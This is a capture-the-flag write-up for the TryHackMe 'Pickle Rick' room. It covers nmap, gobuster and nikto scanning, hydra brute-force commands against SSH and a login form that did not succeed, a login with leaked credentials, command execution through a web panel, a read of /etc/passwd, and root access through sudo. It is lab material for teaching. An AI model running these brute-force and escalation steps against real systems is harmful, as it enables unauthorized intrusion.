---
title: "THM:picklerick"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/picklerick"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,nikto,hydra,robots.txt,sudo
---
# THM:Pickle Rick

URL: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -Pn xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://xxx.xxx.xxx.xxx`

But then ultimately ran again using the `common.txt` dirb wordlist:

> `gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/robots.txt           (Status: 200) [Size: 17] 
```

*Also see: [gobuster.log](gobuster.log) and [gobuster_common.log](gobuster_common.log)*

### Running: `nikto`

Ran the following:

> `nikto -h xxx.xxx.xxx.xxx`

Found the following:

```python
+ /login.php: Admin login page/section found.
```

Also see: [nikto.log](nikto.log)

## Gaining Access

### Unprivileged Access

Unsuccessfully, I did try using the username found in the HTML source of the main `index.html` page with hydra to brute force SSH and the login page, but those didn't work. Those commands were:

#### SSH

```bash
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt \
    ssh://xxx.xxx.xxx.xxx
```

*See: [hydra.ssh.log](hydra.ssh.log)*

#### HTTP

```bash
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt \
    xxx.xxx.xxx.xxx http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

*See: [hydra.web.log](hydra.web.log)*

---

Next, using the username found in the HTML source of the main `index.html` page, and using the potential password we found in `/robots.txt`, we try those credentials from the `/login.php` page, and find that we can log in and use a "Command Panel" which appears to let us run arbitrary commands, and see the results.

We can run `ls -la` to find:

```bash
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

The contents of `Sup3rS3cretPickl3Ingred.txt` are the answer to the "first ingredient" needed for this room.

---

If we run `less /etc/passwd` we can see that there is a user account called `ubuntu`. Or, we can run `ls -la /home/` to see the users who have a home directory. With that, we can see a directory listing of that users' home directory with `ls -ls /home/rick` and get:

```bash
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

The contents of `second ingredients` are the answer to the "second ingredient" needed for this room.

### Privilege Escalation

With this access we have, we can also look in the `ubuntu` users home folder with `ls -la /home/ubuntu` and see:

```bash
total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
```

Since we have a `.sudo_as_admin_successful` file, we might assume we have some `sudo` privileges, so we run `sudo -l` to see:

```bash
Matching Defaults entries for www-data on ip-10-10-243-208.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-243-208.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Wow. So, the `ubuntu` account has `sudo` privilege and no password prompt. Let's use that to look in the `root` home folder with `sudo ls -la /root` to find:

```bash
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Feb  6 02:07 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
```

The contents of `3rd.txt` are the answer to the "final ingredient" needed to complete this room.

## Maintaining Access

None needed.

## Clearing Tracks

We never actually "hacked" into this server, so there is nothing to clear.

## Summary

Completed: [2022-02-05 21:56:08]